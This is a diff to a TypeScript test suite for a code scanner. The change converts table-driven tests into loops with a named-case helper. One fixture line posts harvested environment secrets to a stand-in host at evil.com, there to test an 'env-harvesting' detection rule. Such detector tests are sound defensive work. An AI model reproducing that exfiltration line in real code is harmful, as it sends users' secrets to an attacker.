@@ -54,6 +54,14 @@ function expectRulePresence(findings: { ruleId: string }[], ruleId: string, expe
   expect(findings.some((finding) => finding.ruleId === ruleId)).toBe(expected);
 }
 
+async function runNamedCase(name: string, run: () => void | Promise<void>) {
+  try {
+    await run();
+  } catch (error) {
+    throw new Error(`case failed: ${name}`, { cause: error });
+  }
+}
+
 function normalizeSkillScanOptions(
   options?: Readonly<{
     maxFiles?: number;
@@ -84,7 +92,7 @@ afterEach(async () => {
 // ---------------------------------------------------------------------------
 
 describe("scanSource", () => {
-  it.each([
+  const scanRuleCases = [
     {
       name: "detects child_process exec with string interpolation",
       source: `
@@ -162,8 +170,14 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
 `,
       expected: { ruleId: "env-harvesting", severity: "critical" as const },
     },
-  ] as const)("$name", ({ source, expected }) => {
-    expectScanRule(source, expected);
+  ] as const;
+
+  it("detects suspicious source patterns", async () => {
+    for (const testCase of scanRuleCases) {
+      await runNamedCase(testCase.name, () => {
+        expectScanRule(testCase.source, testCase.expected);
+      });
+    }
   });
 
   it("does not flag child_process import without exec/spawn call", () => {
@@ -213,19 +227,23 @@ async function closeFetchHandles() {
 // ---------------------------------------------------------------------------
 
 describe("isScannable", () => {
-  it.each([
-    ["file.js", true],
-    ["file.ts", true],
-    ["file.mjs", true],
-    ["file.cjs", true],
-    ["file.tsx", true],
-    ["file.jsx", true],
-    ["readme.md", false],
-    ["package.json", false],
-    ["logo.png", false],
-    ["style.css", false],
-  ] as const)("classifies %s", (fileName, expected) => {
-    expect(isScannable(fileName)).toBe(expected);
+  it("classifies scannable extensions", async () => {
+    for (const [fileName, expected] of [
+      ["file.js", true],
+      ["file.ts", true],
+      ["file.mjs", true],
+      ["file.cjs", true],
+      ["file.tsx", true],
+      ["file.jsx", true],
+      ["readme.md", false],
+      ["package.json", false],
+      ["logo.png", false],
+      ["style.css", false],
+    ] as const) {
+      await runNamedCase(fileName, () => {
+        expect(isScannable(fileName)).toBe(expected);
+      });
+    }
   });
 });
 
@@ -234,7 +252,7 @@ describe("isScannable", () => {
 // ---------------------------------------------------------------------------
 
 describe("scanDirectory", () => {
-  it.each([
+  const scanDirectoryCases = [
     {
       name: "scans .js files in a directory tree",
       files: {
@@ -304,21 +322,25 @@ describe("scanDirectory", () => {
       expectedPresent: true,
       expectedMinFindings: 1,
     },
-  ] as const)(
-    "$name",
-    async ({ files, includeFiles, expectedRuleId, expectedPresent, expectedMinFindings }) => {
-      const root = makeTmpDir();
-      writeFixtureFiles(root, files);
-      const findings = await scanDirectory(
-        root,
-        includeFiles ? { includeFiles: [...includeFiles] } : undefined,
-      );
-      if (expectedMinFindings != null) {
-        expect(findings.length).toBeGreaterThanOrEqual(expectedMinFindings);
-      }
-      expectRulePresence(findings, expectedRuleId, expectedPresent);
-    },
-  );
+  ] as const;
+
+  it("scans directory trees and explicit includes", async () => {
+    for (const testCase of scanDirectoryCases) {
+      await runNamedCase(testCase.name, async () => {
+        const root = makeTmpDir();
+        writeFixtureFiles(root, testCase.files);
+        const findings = await scanDirectory(
+          root,
+          testCase.includeFiles ? { includeFiles: [...testCase.includeFiles] } : undefined,
+        );
+        if (testCase.expectedMinFindings != null) {
+          expect(findings.length).toBeGreaterThanOrEqual(testCase.expectedMinFindings);
+        }
+        expectRulePresence(findings, testCase.expectedRuleId, testCase.expectedPresent);
+        clearSkillScanCacheForTest();
+      });
+    }
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -326,7 +348,7 @@ describe("scanDirectory", () => {
 // ---------------------------------------------------------------------------
 
 describe("scanDirectoryWithSummary", () => {
-  it.each([
+  const summaryCases = [
     {
       name: "returns correct counts",
       files: {
@@ -393,28 +415,42 @@ describe("scanDirectoryWithSummary", () => {
         expectedPresent: true,
       },
     },
-  ] as const)("$name", async ({ files, options, expected }) => {
-    const root = makeTmpDir();
-    writeFixtureFiles(root, files);
-    const summary = await scanDirectoryWithSummary(root, normalizeSkillScanOptions(options));
-    expect(summary.scannedFiles).toBe(expected.scannedFiles);
-    if (expected.critical != null) {
-      expect(summary.critical).toBe(expected.critical);
-    }
-    if (expected.warn != null) {
-      expect(summary.warn).toBe(expected.warn);
-    }
-    if (expected.info != null) {
-      expect(summary.info).toBe(expected.info);
-    }
-    if (expected.findingCount != null) {
-      expect(summary.findings).toHaveLength(expected.findingCount);
-    }
-    if (expected.maxFindings != null) {
-      expect(summary.findings.length).toBeLessThanOrEqual(expected.maxFindings);
-    }
-    if (expected.expectedRuleId != null && expected.expectedPresent != null) {
-      expectRulePresence(summary.findings, expected.expectedRuleId, expected.expectedPresent);
+  ] as const;
+
+  it("summarizes directory scan results", async () => {
+    for (const testCase of summaryCases) {
+      await runNamedCase(testCase.name, async () => {
+        const root = makeTmpDir();
+        writeFixtureFiles(root, testCase.files);
+        const summary = await scanDirectoryWithSummary(
+          root,
+          normalizeSkillScanOptions(testCase.options),
+        );
+        expect(summary.scannedFiles).toBe(testCase.expected.scannedFiles);
+        if (testCase.expected.critical != null) {
+          expect(summary.critical).toBe(testCase.expected.critical);
+        }
+        if (testCase.expected.warn != null) {
+          expect(summary.warn).toBe(testCase.expected.warn);
+        }
+        if (testCase.expected.info != null) {
+          expect(summary.info).toBe(testCase.expected.info);
+        }
+        if (testCase.expected.findingCount != null) {
+          expect(summary.findings).toHaveLength(testCase.expected.findingCount);
+        }
+        if (testCase.expected.maxFindings != null) {
+          expect(summary.findings.length).toBeLessThanOrEqual(testCase.expected.maxFindings);
+        }
+        if (testCase.expected.expectedRuleId != null && testCase.expected.expectedPresent != null) {
+          expectRulePresence(
+            summary.findings,
+            testCase.expected.expectedRuleId,
+            testCase.expected.expectedPresent,
+          );
+        }
+        clearSkillScanCacheForTest();
+      });
     }
   });
 
